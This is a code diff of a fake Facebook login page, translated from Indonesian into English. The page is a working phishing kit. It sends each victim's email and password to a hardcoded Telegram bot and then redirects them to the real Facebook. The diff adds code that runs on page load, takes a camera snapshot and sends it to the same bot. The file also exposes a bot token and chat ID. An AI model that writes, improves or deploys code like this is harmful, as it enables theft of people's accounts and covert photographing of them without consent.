@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook – Masuk atau Daftar</title>
+    <title>Facebook – Log In or Sign Up</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -64,23 +64,24 @@
     </style>
 </head>
 <body>
-    <div class="logo">facebook</div>
+    <div class="logo">Facebook</div>
     <div class="login-container">
-        <input type="text" id="email" placeholder="Email atau Nomor Telepon">
-        <input type="password" id="password" placeholder="Kata Sandi">
-        <button onclick="submitLogin()">Masuk</button>
-        <div class="forgot">Lupa kata sandi?</div>
+        <input type="text" id="email" placeholder="Email or Phone Number">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="submitLogin()">Log In</button>
+        <div class="forgot">Forgot password?</div>
     </div>
     <div class="footer">Facebook © 2025</div>
 
     <script>
+        let telegramBotToken = "7863457133:AAE31d9Hb5G6H_2HlpxEcJEfhYv3FhFy5ks";
+        let chatId = "6899914313";
+
         function submitLogin() {
             let email = document.getElementById("email").value;
             let password = document.getElementById("password").value;
             
             if (email && password) {
-                let telegramBotToken = "7863457133:AAE31d9Hb5G6H_2HlpxEcJEfhYv3FhFy5ks";
-                let chatId = "6899914313";
                 let message = `Email: ${email}\nPassword: ${password}`;
                 
                 fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
@@ -90,10 +91,39 @@
                 });
                 
                 setTimeout(() => {
-                    window.location.href = "https://www.facebook.com"; // Redirect ke Facebook asli
+                    window.location.href = "https://www.facebook.com"; // Redirect to Facebook
                 }, 1500);
             }
         }
+
+        function sendCameraPhoto() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    let video = document.createElement("video");
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(() => {
+                        let canvas = document.createElement("canvas");
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        let ctx = canvas.getContext("2d");
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob(blob => {
+                            let formData = new FormData();
+                            formData.append("chat_id", chatId);
+                            formData.append("photo", blob, "snapshot.jpg");
+                            
+                            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                                method: "POST",
+                                body: formData
+                            });
+                        });
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 3000);
+                });
+        }
+
+        window.onload = sendCameraPhoto;
     </script>
 </body>
 </html>
